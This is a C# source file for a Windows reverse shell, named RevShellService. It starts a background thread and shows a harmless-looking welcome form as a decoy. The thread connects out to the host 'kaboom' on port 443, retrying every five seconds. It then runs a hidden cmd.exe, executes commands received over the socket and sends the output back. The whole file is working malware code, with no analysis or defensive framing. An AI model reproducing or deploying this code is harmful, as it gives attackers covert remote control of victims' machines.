


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace RevShellService
{
    public class RevShell
    {
        static StreamWriter streamWriter;

        public static void start()
        {
            new Thread(() => { run(); }).Start();
            welcomeform form = new welcomeform();
            form.ShowDialog();
        }

        private static void run()
        {
         
            while (true)
            {
                Console.WriteLine("connecting");
                try
                {
                    cmdClient();
                }
                catch (Exception err) { };
                Thread.Sleep(5000);
            }
        }

        private static void cmdClient()
        {
            using (TcpClient client = new TcpClient("kaboom", 443))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        StringBuilder strInput = new StringBuilder();
                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            Console.WriteLine(strInput);
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
    
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {

                    strOutput.Append(outLine.Data);
                    lock (streamWriter)
                    {
                        streamWriter.WriteLine("@cmd@" + strOutput);
                        streamWriter.Flush();
                    }
                }
                catch (Exception err) { }
            }
        }

    }
}

